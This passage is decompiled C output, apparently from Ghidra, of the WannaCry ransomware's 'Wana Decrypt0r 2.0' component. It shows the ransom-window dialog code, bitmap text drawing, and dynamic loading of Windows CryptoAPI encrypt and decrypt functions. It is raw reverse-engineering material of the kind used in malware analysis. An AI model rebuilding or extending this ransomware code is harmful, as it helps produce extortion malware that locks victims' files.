  puVar3 = &stack0x00000008;
  iVar1 = (*DAT_004217d0)(*(undefined4 *)((int)this + 8),0,1,0,param_1);
  if (iVar1 == 0) {
    LeaveCriticalSection(lpCriticalSection);
    return 0;
  }
  LeaveCriticalSection(lpCriticalSection);
  uVar2 = (uint)puVar3 >> 2;
  while (uVar2 != 0) {
    uVar2 = uVar2 - 1;
    *unaff_EDI = *param_1;
    param_1 = param_1 + 1;
    unaff_EDI = unaff_EDI + 1;
  }
  uVar2 = (uint)puVar3 & 3;
  while (uVar2 != 0) {
    uVar2 = uVar2 - 1;
    *(undefined *)unaff_EDI = *(undefined *)param_1;
    param_1 = (undefined4 *)((int)param_1 + 1);
    unaff_EDI = (undefined4 *)((int)unaff_EDI + 1);
  }
  *(undefined **)unaff_ESI = puVar3;
  return 1;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00404b70(void)

{
  HMODULE hModule;
  
  if (DAT_004217c0 != (FARPROC)0x0) {
    return 1;
  }
  hModule = LoadLibraryA(s_advapi32_dll_0041fdb4);
  if (hModule != (HMODULE)0x0) {
    DAT_004217c0 = GetProcAddress(hModule,s_CryptAcquireContextA_00420cb8);
    DAT_004217c4 = GetProcAddress(hModule,s_CryptImportKey_00420ca8);
    DAT_004217c8 = GetProcAddress(hModule,s_CryptDestroyKey_00420c98);
    DAT_004217cc = GetProcAddress(hModule,s_CryptEncrypt_00420c88);
    DAT_004217d0 = GetProcAddress(hModule,s_CryptDecrypt_00420c78);
    _DAT_004217d4 = GetProcAddress(hModule,s_CryptGenKey_00420c6c);
    if ((((DAT_004217c0 != (FARPROC)0x0) && (DAT_004217c4 != (FARPROC)0x0)) &&
        (DAT_004217c8 != (FARPROC)0x0)) &&
       (((DAT_004217cc != (FARPROC)0x0 && (DAT_004217d0 != (FARPROC)0x0)) &&
        (_DAT_004217d4 != (FARPROC)0x0)))) {
      return 1;
    }
  }
  return 0;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __thiscall FUN_00404c40(void *this,CWnd *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413809;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CDialog((CDialog *)this,0x89,param_1);
  local_4 = 0;
  CString((CString *)((int)this + 0x60));
  *(undefined4 *)((int)this + 0x68) = 0;
  *(undefined4 *)((int)this + 100) = 0x415a44;
  *(undefined4 *)((int)this + 0x74) = 0;
  *(undefined4 *)((int)this + 0x70) = 0x415a30;
  local_4 = CONCAT31(local_4._1_3_,3);
  *(undefined4 *)this = 0x415ec8;
  operator_((CString *)((int)this + 0x60),(char *)&this_00421798);
  *in_FS_OFFSET = local_c;
  return (undefined4 *)this;
}

CDialog * __thiscall FUN_00404cd0(void *this,byte param_1)

{
  FUN_00404cf0((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00404cf0(CDialog *param_1)

{
  undefined4 *this;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &this_0041384e;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  this = (undefined4 *)(param_1 + 0x70);
  *this = 0x415c00;
  local_4._0_1_ = 3;
  local_4._1_3_ = 0;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  this = (undefined4 *)(param_1 + 100);
  *this = 0x415c00;
  local_4._0_1_ = 4;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4 = (uint)local_4._1_3_ << 8;
  _CString((CString *)(param_1 + 0x60));
  local_4 = 0xffffffff;
  _CDialog(param_1);
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 __fastcall FUN_00404dd0(CDialog *param_1)

{
  CGdiObject *this;
  COLORREF color;
  HBRUSH pHVar1;
  HFONT pHVar2;
  CWnd *pCVar3;
  WPARAM wParam;
  
  OnInitDialog(param_1);
  color = *(COLORREF *)(DAT_0042189c + 0x824);
  *(COLORREF *)(param_1 + 0x6c) = color;
  pHVar1 = CreateSolidBrush(color);
  Attach((CGdiObject *)(param_1 + 100),pHVar1);
  this = (CGdiObject *)(param_1 + 0x70);
  pHVar2 = CreateFontA(0x10,0,0,0,700,0,0,0,0,0,0,0,0x20,s_Arial_004206d8);
  Attach(this,pHVar2);
  pCVar3 = GetDlgItem((CWnd *)param_1,0x403);
  if (this == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)(param_1 + 0x74);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)param_1,1);
  if (this == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)(param_1 + 0x74);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)param_1,2);
  if (this == (CGdiObject *)0x0) {
    SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,0,1);
    return 1;
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,*(WPARAM *)(param_1 + 0x74),1);
  return 1;
}

BOOL __thiscall FUN_00404eb0(void *this,CDC *param_1)

{
  CBrush *pCVar1;
  BOOL BVar2;
  undefined4 *in_FS_OFFSET;
  undefined **local_24 [2];
  tagRECT local_1c;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413870;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  GetClientRect(*(HWND *)((int)this + 0x20),(LPRECT)&local_1c);
  CBrush((CBrush *)local_24,*(ulong *)((int)this + 0x6c));
  local_4 = 0;
  pCVar1 = SelectObject(param_1,(CBrush *)local_24);
  BVar2 = PatBlt(*(HDC *)(param_1 + 4),0,0,local_1c.right - local_1c.left,
                 local_1c.bottom - local_1c.top,0xf00021);
  SelectObject(param_1,pCVar1);
  local_24[0] = &PTR_LAB_00415c00;
  local_4 = 1;
  DeleteObject((CGdiObject *)local_24);
  *in_FS_OFFSET = local_c;
  return BVar2;
}

void __fastcall FUN_00404fe0(CWnd *param_1)

{
  UpdateData(param_1,1);
  if (*(int *)(*(int *)(param_1 + 0x60) + -8) != 0) {
    OnOK((CDialog *)param_1);
  }
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __fastcall FUN_00405000(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413893;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CWnd((CWnd *)param_1);
  *param_1 = 0x415d70;
  local_4 = 0;
  CString((CString *)(param_1 + 0x11));
  local_4 = CONCAT31(local_4._1_3_,1);
  *param_1 = 0x416008;
  FUN_00405820(param_1,0);
  FUN_00405800(param_1,0);
  param_1[0x14] = 0xffb53f;
  param_1[0x13] = 0x674017;
  param_1[0x15] = 0;
  *(undefined *)((int)param_1 + 0x4a) = 0;
  *(undefined *)((int)param_1 + 0x4b) = 0;
  *in_FS_OFFSET = local_c;
  return param_1;
}

undefined4 * __thiscall FUN_00405080(void *this,byte param_1)

{
  FUN_004050a0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_004050a0(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004138a8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x416008;
  local_4 = 0;
  _CString((CString *)(param_1 + 0x11));
  local_4 = 0xffffffff;
  _CStatic((CStatic *)param_1);
  *in_FS_OFFSET = local_c;
  return;
}

uint __thiscall FUN_00405110(void *this,int *param_1,char param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  
  iVar1 = (int)param_2;
  iVar2 = iVar1 + -0x20;
  *param_1 = iVar2;
  if (iVar2 < 0x20) {
    iVar1 = (*(int *)((int)this + 0x68) + *(int *)((int)this + 0x60)) * iVar2;
  }
  else {
    if (iVar2 < 0x40) {
      iVar1 = iVar1 + -0x40;
    }
    else {
      iVar1 = iVar1 + -0x60;
    }
    iVar1 = (*(int *)((int)this + 0x68) + *(int *)((int)this + 0x60)) * iVar1;
  }
  *param_1 = iVar1;
  uVar3 = (*(int *)((int)this + 0x6c) + *(int *)((int)this + 100)) *
          ((int)(iVar2 + (iVar2 >> 0x1f & 0x1fU)) >> 5);
  param_1[1] = uVar3;
  param_1[2] = *(int *)((int)this + 0x60) + *param_1;
  param_1[3] = *(int *)((int)this + 100) + uVar3;
  return uVar3 & 0xffffff00;
}

void __thiscall FUN_00405180(void *this,uchar *param_1)

{
  int iVar1;
  
  iVar1 = _mbscmp(*(uchar **)((int)this + 0x44),param_1);
  if (iVar1 != 0) {
    operator_((CString *)((int)this + 0x44),(char *)param_1);
    *(undefined *)((int)this + 0x48) = 1;
    if (*(int *)((int)this + 0x74) == 0) {
      FUN_00405800(this,0);
    }
    if (*(int *)((int)this + 0x70) == 0) {
      FUN_00405820(this,0);
    }
    if (*(char *)((int)this + 0x49) != '\0') {
      RedrawWindow(*(HWND *)((int)this + 0x20),(RECT *)0x0,(HRGN)0x0,0x121);
      return;
    }
    InvalidateRect(*(HWND *)((int)this + 0x20),(RECT *)0x0,1);
  }
  return;
}

void __thiscall FUN_00405200(void *this,int param_1)

{
  if (param_1 == 0) {
    *(undefined4 *)((int)this + 0x60) = 0xe;
    *(undefined4 *)((int)this + 100) = 0x14;
    *(undefined4 *)((int)this + 0x68) = 2;
    *(undefined4 *)((int)this + 0x6c) = 2;
    *(undefined4 *)((int)this + 0x58) = 0x86;
  }
  return;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00405580(CWnd *param_1)

{
  int iVar1;
  AFX_MODULE_STATE *pAVar2;
  void *ho;
  HDC pHVar3;
  CGdiObject *pCVar4;
  int x;
  int iVar5;
  undefined4 *in_FS_OFFSET;
  int iStack208;
  int local_cc;
  int iStack200;
  CDC aCStack192 [4];
  HDC__ *pHStack188;
  int local_b0;
  HBRUSH pHStack172;
  CGdiObject *pCStack168;
  uint uStack164;
  undefined4 local_a0;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  int iStack128;
  int iStack124;
  RECT local_70;
  CPaintDC local_60 [4];
  HDC pHStack92;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413943;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  GetClientRect(*(HWND *)(param_1 + 0x20),(LPRECT)&local_70);
  x = 0;
  local_cc = 0;
  iVar1 = *(int *)(*(int *)(param_1 + 0x44) + -8);
  if (iVar1 != 0) {
    local_b0 = iVar1;
    CPaintDC(local_60,param_1);
    local_9c = *(undefined4 *)(param_1 + 0x50);
    local_94 = *(undefined4 *)(param_1 + 0x4c);
    local_8c = *(undefined4 *)(param_1 + 0x54);
    local_4 = 0;
    local_a0 = 0xffb53f;
    local_98 = 0x674017;
    local_90 = 0;
    pAVar2 = AfxGetModuleState();
    ho = (void *)Ordinal_8(*(undefined4 *)(pAVar2 + 8),*(undefined4 *)(param_1 + 0x58),0,&local_a0,3
                          );
    CDC(aCStack192);
    local_4 = CONCAT31(local_4._1_3_,1);
    pHVar3 = CreateCompatibleDC((HDC)(-(uint)((undefined *)register0x00000010 != (undefined *)0x60)
                                     & (uint)pHStack92));
    Attach(aCStack192,(HDC__ *)pHVar3);
    pCVar4 = FromHandle(ho);
    if (pCVar4 != (CGdiObject *)0x0) {
      pCVar4 = *(CGdiObject **)(pCVar4 + 4);
    }
    pCStack168 = SelectGdiObject(pHStack188,pCVar4);
    iVar5 = 0;
    iStack208 = 1;
    pHStack172 = CreateSolidBrush(*(COLORREF *)(param_1 + 0x54));
    FillRect(pHStack92,&local_70,pHStack172);
    iStack200 = 0;
    if (0 < iVar1) {
      do {
        uStack164 = uStack164 & 0xffffff00 | (uint)*(byte *)(*(int *)(param_1 + 0x44) + iStack200);
        FUN_00405110(param_1,&iStack128,*(byte *)(*(int *)(param_1 + 0x44) + iStack200));
        BitBlt(pHStack92,x,local_cc,*(int *)(param_1 + 0x60) + *(int *)(param_1 + 0x68),
               *(int *)(param_1 + 100) + *(int *)(param_1 + 0x6c),
               (HDC)(-(uint)((undefined *)register0x00000010 != (undefined *)0xc0) &
                    (uint)pHStack188),iStack128,iStack124,0xcc0020);
        x = x + *(int *)(param_1 + 0x60) + *(int *)(param_1 + 0x68);
        iVar5 = iVar5 + 1;
        if (iVar5 == *(int *)(param_1 + 0x74)) {
          iVar1 = *(int *)(param_1 + 0x70);
          if (iVar1 == 1) break;
          if ((iVar5 == *(int *)(param_1 + 0x74)) && (1 < iVar1)) {
            if (iStack208 == iVar1) break;
            iVar5 = 0;
            x = 0;
            local_cc = local_cc + *(int *)(param_1 + 100) + *(int *)(param_1 + 0x6c);
            iStack208 = iStack208 + 1;
          }
        }
        iStack200 = iStack200 + 1;
      } while (iStack200 < local_b0);
    }
    pCVar4 = pCStack168;
    if (pCStack168 != (CGdiObject *)0x0) {
      pCVar4 = *(CGdiObject **)(pCStack168 + 4);
    }
    SelectGdiObject(pHStack188,pCVar4);
    DeleteDC(aCStack192);
    DeleteObject(ho);
    DeleteObject(pHStack172);
    local_4 = local_4 & 0xffffff00;
    _CDC(aCStack192);
    local_4 = 0xffffffff;
    _CPaintDC(local_60);
  }
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00405800(void *this,int param_1)

{
  if (param_1 == 0) {
    *(undefined4 *)((int)this + 0x74) = *(undefined4 *)(*(int *)((int)this + 0x44) + -8);
    return;
  }
  *(int *)((int)this + 0x74) = param_1;
  return;
}

void __thiscall FUN_00405820(void *this,int param_1)

{
  if (param_1 == 0) {
    if (*(int *)((int)this + 0x74) != 0) {
      *(int *)((int)this + 0x70) =
           *(int *)(*(int *)((int)this + 0x44) + -8) / *(int *)((int)this + 0x74);
      *(undefined4 *)((int)this + 0x70) = 0;
      return;
    }
    *(undefined4 *)((int)this + 0x70) = 1;
  }
  *(int *)((int)this + 0x70) = param_1;
  return;
}

void __thiscall FUN_00405860(void *this,int param_1)

{
  tagRECT local_10;
  
  if (*(int *)((int)this + 0x74) == 0) {
    *(int *)((int)this + 0x74) = param_1;
  }
  GetClientRect(*(HWND *)((int)this + 0x20),(LPRECT)&local_10);
  SetWindowPos((CWnd *)this,(CWnd *)0x0,0,0,
               (*(int *)((int)this + 0x68) + *(int *)((int)this + 0x60)) * param_1,
               local_10.bottom - local_10.top,2);
  return;
}

void __thiscall FUN_004058c0(void *this,int param_1)

{
  tagRECT local_10;
  
  if (*(int *)((int)this + 0x70) == 0) {
    *(int *)((int)this + 0x70) = param_1;
  }
  GetClientRect(*(HWND *)((int)this + 0x20),(LPRECT)&local_10);
  SetWindowPos((CWnd *)this,(CWnd *)0x0,0,0,local_10.right - local_10.left,
               (*(int *)((int)this + 0x6c) + *(int *)((int)this + 100)) * param_1,2);
  return;
}

void __thiscall FUN_00405920(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00405950(this,param_1);
  FUN_00405970(this,param_3,param_2);
  return;
}

void __thiscall FUN_00405950(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 0x54) = param_1;
  InvalidateRect(*(HWND *)((int)this + 0x20),(RECT *)0x0,1);
  return;
}

void __thiscall FUN_00405970(void *this,undefined4 param_1,undefined4 param_2)

{
  *(undefined4 *)((int)this + 0x4c) = param_1;
  *(undefined4 *)((int)this + 0x50) = param_2;
  InvalidateRect(*(HWND *)((int)this + 0x20),(RECT *)0x0,1);
  return;
}

void __thiscall FUN_00405990(void *this,undefined param_1,undefined param_2)

{
  *(undefined *)((int)this + 0x4b) = param_1;
  *(undefined *)((int)this + 0x40) = param_2;
  return;
}

undefined4 * __fastcall FUN_004059d0(undefined4 *param_1)

{
  CWinApp((CWinApp *)param_1,(char *)0x0);
  *param_1 = 0x416100;
  return param_1;
}

CWinApp * __thiscall FUN_004059f0(void *this,byte param_1)

{
  _CWinApp((CWinApp *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CWinApp *)this;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x00412eea. Too many branches
                    // WARNING: Treating indirect jump as call
  _CWinApp();
  return;
}

void FUN_00405a30(void)

{
  FUN_004059d0((undefined4 *)&DAT_004217d8);
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __fastcall FUN_00405a60(CWinApp *param_1)

{
  undefined4 *in_FS_OFFSET;
  CDialog local_8a4 [96];
  CComboBox local_844 [64];
  CButton local_804 [64];
  CButton local_7c4 [64];
  undefined4 local_784 [33];
  undefined4 local_700 [33];
  undefined4 local_67c [26];
  undefined4 local_614 [26];
  undefined4 local_5ac [26];
  undefined4 local_544 [26];
  undefined4 local_4dc [31];
  undefined4 local_460 [31];
  CRichEditCtrl local_3e4 [64];
  CString local_3a4 [4];
  CString local_3a0 [4];
  CString local_39c [788];
  CString local_88 [20];
  undefined4 local_74 [2];
  undefined4 local_6c [2];
  undefined **local_64 [2];
  undefined **local_5c [2];
  undefined **local_54 [2];
  undefined **local_4c [2];
  undefined **local_44 [2];
  undefined **local_3c [2];
  undefined **local_34 [2];
  undefined **local_2c [2];
  undefined **local_24 [2];
  undefined **local_1c [2];
  undefined **local_14 [2];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &this_00413a76;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_0040b620(u_Wana_Decrypt0r_2_0_00420cd0,1);
  AfxEnableControlContainer((COccManager *)0x0);
  Enable3dControls(param_1);
  AfxInitRichEdit();
  FUN_004060e0(local_8a4,(CWnd *)0x0);
  local_4 = 0;
  *(CDialog **)(param_1 + 0x20) = local_8a4;
  DoModal(local_8a4);
  local_4 = 0x1d;
  local_14[0] = &PTR_LAB_00415a30;
  FUN_00403f20(local_14);
  local_4._0_1_ = 0x1c;
  local_1c[0] = &PTR_LAB_00415a30;
  FUN_00403f20(local_1c);
  local_4._0_1_ = 0x1b;
  local_24[0] = &PTR_LAB_00415a30;
  FUN_00403f20(local_24);
  local_4._0_1_ = 0x1a;
  local_2c[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_2c);
  local_4._0_1_ = 0x19;
  local_34[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_34);
  local_4._0_1_ = 0x18;
  local_3c[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_3c);
  local_4._0_1_ = 0x17;
  local_44[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_44);
  local_4._0_1_ = 0x16;
  local_4c[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_4c);
  local_4._0_1_ = 0x15;
  local_54[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_54);
  local_4._0_1_ = 0x14;
  local_5c[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_5c);
  local_4._0_1_ = 0x13;
  local_64[0] = &PTR_LAB_00415a44;
  FUN_00403f20(local_64);
  local_4._0_1_ = 0x12;
  FUN_00403f90(local_6c);
  local_4._0_1_ = 0x11;
  FUN_00403f90(local_74);
  local_4._0_1_ = 0x10;
  _CString(local_88);
  local_4._0_1_ = 0xf;
  _CString(local_39c);
  local_4._0_1_ = 0xe;
  _CString(local_3a0);
  local_4._0_1_ = 0xd;
  _CString(local_3a4);
  local_4._0_1_ = 0xc;
  _CRichEditCtrl(local_3e4);
  local_4._0_1_ = 0xb;
  FUN_004050a0(local_460);
  local_4._0_1_ = 10;
  FUN_004050a0(local_4dc);
  local_4._0_1_ = 9;
  FUN_00404170(local_544);
  local_4._0_1_ = 8;
  FUN_00404170(local_5ac);
  local_4._0_1_ = 7;
  FUN_00404170(local_614);
  local_4._0_1_ = 6;
  FUN_00404170(local_67c);
  local_4._0_1_ = 5;
  FUN_00405d90(local_700);
  local_4._0_1_ = 4;
  FUN_00405d90(local_784);
  local_4._0_1_ = 3;
  _CButton(local_7c4);
  local_4._0_1_ = 2;
  _CButton(local_804);
  local_4 = CONCAT31(local_4._1_3_,1);
  _CComboBox(local_844);
  local_4 = 0xffffffff;
  _CDialog(local_8a4);
  *in_FS_OFFSET = local_c;
  return 0;
}

void __fastcall FUN_00405d90(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00413a88;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x4161a4;
  local_4 = 0;
  _CDWordArray((CDWordArray *)(param_1 + 0x10));
  local_4 = 0xffffffff;
  _CProgressCtrl((CProgressCtrl *)param_1);
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00405df0(void *this,byte param_1)

{
  FUN_00405d90((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00405e10(CDialog *param_1)

{
  undefined4 *this;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &this_00413c65;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  this = (undefined4 *)(param_1 + 0x890);
  *this = 0x415c00;
  local_4._0_1_ = 0x1d;
  local_4._1_3_ = 0;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  this = (undefined4 *)(param_1 + 0x888);
  *this = 0x415c00;
  local_4._0_1_ = 0x1e;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  this = (undefined4 *)(param_1 + 0x880);
  *this = 0x415c00;
  local_4._0_1_ = 0x1f;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  this = (undefined4 *)(param_1 + 0x878);
  *this = 0x415c00;
  local_4._0_1_ = 0x20;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4._0_1_ = 0x18;
  *(undefined4 *)(param_1 + 0x870) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x870));
  local_4._0_1_ = 0x17;
  *(undefined4 *)(param_1 + 0x868) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x868));
  local_4._0_1_ = 0x16;
  *(undefined4 *)(param_1 + 0x860) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x860));
  local_4._0_1_ = 0x15;
  *(undefined4 *)(param_1 + 0x858) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x858));
  this = (undefined4 *)(param_1 + 0x850);
  *this = 0x415c00;
  local_4._0_1_ = 0x21;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4._0_1_ = 0x13;
  *(undefined4 *)(param_1 + 0x848) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x848));
  local_4._0_1_ = 0x12;
  *(undefined4 *)(param_1 + 0x840) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x840));
  local_4._0_1_ = 0x11;
  *(undefined4 *)(param_1 + 0x838) = 0x415a44;
  FUN_00403f20((undefined4 *)(param_1 + 0x838));
  this = (undefined4 *)(param_1 + 0x830);
  *this = 0x415c00;
  local_4._0_1_ = 0x22;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4._0_1_ = 0xf;
  _CString((CString *)(param_1 + 0x81c));
  local_4._0_1_ = 0xe;
  _CString((CString *)(param_1 + 0x508));
  local_4._0_1_ = 0xd;
  _CString((CString *)(param_1 + 0x504));
  local_4._0_1_ = 0xc;
  _CString((CString *)(param_1 + 0x500));
  local_4._0_1_ = 0xb;
  _CRichEditCtrl((CRichEditCtrl *)(param_1 + 0x4c0));
  local_4._0_1_ = 10;
  FUN_004050a0((undefined4 *)(param_1 + 0x444));
  local_4._0_1_ = 9;
  FUN_004050a0((undefined4 *)(param_1 + 0x3c8));
  local_4._0_1_ = 8;
  FUN_00404170((undefined4 *)(param_1 + 0x360));
  local_4._0_1_ = 7;
  FUN_00404170((undefined4 *)(param_1 + 0x2f8));
  local_4._0_1_ = 6;
  FUN_00404170((undefined4 *)(param_1 + 0x290));
  local_4._0_1_ = 5;
  FUN_00404170((undefined4 *)(param_1 + 0x228));
  *(undefined4 *)(param_1 + 0x1a4) = 0x4161a4;
  local_4._0_1_ = 0x23;
  _CDWordArray((CDWordArray *)(param_1 + 0x1e4));
  local_4._0_1_ = 4;
  _CProgressCtrl((CProgressCtrl *)(param_1 + 0x1a4));
  local_4._0_1_ = 3;
  FUN_00405d90((undefined4 *)(param_1 + 0x120));
  local_4._0_1_ = 2;
  _CButton((CButton *)(param_1 + 0xe0));
  local_4._0_1_ = 1;
  _CButton((CButton *)(param_1 + 0xa0));
  local_4 = (uint)local_4._1_3_ << 8;
  _CComboBox((CComboBox *)(param_1 + 0x60));
  local_4 = 0xffffffff;
  _CDialog(param_1);
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __thiscall FUN_004060e0(void *this,CWnd *param_1)

{
  HINSTANCE__ *hInstance;
  HICON pHVar1;
  undefined4 *in_FS_OFFSET;
  LPCSTR lpIconName;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413e0b;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CDialog((CDialog *)this,0x66,param_1);
  local_4 = 0;
  CWnd((CWnd *)(undefined4 *)((int)this + 0x60));
  *(undefined4 *)((int)this + 0x60) = 0x415a58;
  local_4._0_1_ = 1;
  CWnd((CWnd *)(undefined4 *)((int)this + 0xa0));
  *(undefined4 *)((int)this + 0xa0) = 0x416538;
  local_4._0_1_ = 2;
  CWnd((CWnd *)(undefined4 *)((int)this + 0xe0));
  *(undefined4 *)((int)this + 0xe0) = 0x416538;
  local_4._0_1_ = 3;
  FUN_004085c0((undefined4 *)((int)this + 0x120));
  local_4._0_1_ = 4;
  FUN_004085c0((undefined4 *)((int)this + 0x1a4));
  local_4._0_1_ = 5;
  FUN_00404090((undefined4 *)((int)this + 0x228));
  local_4._0_1_ = 6;
  FUN_00404090((undefined4 *)((int)this + 0x290));
  local_4._0_1_ = 7;
  FUN_00404090((undefined4 *)((int)this + 0x2f8));
  local_4._0_1_ = 8;
  FUN_00404090((undefined4 *)((int)this + 0x360));
  local_4._0_1_ = 9;
  FUN_00405000((undefined4 *)((int)this + 0x3c8));
  local_4._0_1_ = 10;
  FUN_00405000((undefined4 *)((int)this + 0x444));
  local_4._0_1_ = 0xb;
  CWnd((CWnd *)(undefined4 *)((int)this + 0x4c0));
  *(undefined4 *)((int)this + 0x4c0) = 0x416478;
  local_4._0_1_ = 0xc;
  CString((CString *)((int)this + 0x500));
  local_4._0_1_ = 0xd;
  CString((CString *)((int)this + 0x504));
  local_4._0_1_ = 0xe;
  CString((CString *)((int)this + 0x508));
  local_4._0_1_ = 0xf;
  CString((CString *)((int)this + 0x81c));
  *(undefined4 *)((int)this + 0x834) = 0;
  *(undefined4 *)((int)this + 0x830) = 0x415a44;
  *(undefined4 *)((int)this + 0x83c) = 0;
  *(undefined4 *)((int)this + 0x838) = 0x415a44;
  *(undefined4 *)((int)this + 0x844) = 0;
  *(undefined4 *)((int)this + 0x840) = 0x415a44;
  *(undefined4 *)((int)this + 0x84c) = 0;
  *(undefined4 *)((int)this + 0x848) = 0x415a44;
  *(undefined4 *)((int)this + 0x854) = 0;
  *(undefined4 *)((int)this + 0x850) = 0x415a44;
  *(undefined4 *)((int)this + 0x85c) = 0;
  *(undefined4 *)((int)this + 0x858) = 0x415a44;
  *(undefined4 *)((int)this + 0x864) = 0;
  *(undefined4 *)((int)this + 0x860) = 0x415a44;
  *(undefined4 *)((int)this + 0x86c) = 0;
  *(undefined4 *)((int)this + 0x868) = 0x415a44;
  *(undefined4 *)((int)this + 0x874) = 0;
  *(undefined4 *)((int)this + 0x870) = 0x415a44;
  *(undefined4 *)((int)this + 0x87c) = 0;
  *(undefined4 *)((int)this + 0x878) = 0x415a44;
  *(undefined4 *)((int)this + 0x884) = 0;
  *(undefined4 *)((int)this + 0x880) = 0x415a30;
  local_4._0_1_ = 0x1b;
  FUN_00407640((undefined4 *)((int)this + 0x888));
  *(undefined4 *)((int)this + 0x888) = 0x415a30;
  *(undefined4 *)((int)this + 0x894) = 0;
  *(undefined4 *)((int)this + 0x890) = 0x415a30;
  local_4 = CONCAT31(local_4._1_3_,0x1d);
  *(undefined4 *)this = 0x4163a0;
  operator_((CString *)((int)this + 0x500),(char *)&this_00421798);
  operator_((CString *)((int)this + 0x504),(char *)&this_00421798);
  operator_((CString *)((int)this + 0x508),(char *)&this_00421798);
  AfxGetModuleState();
  lpIconName = (LPCSTR)0x80;
  hInstance = AfxFindResourceHandle((char *)0x80,(char *)0xe);
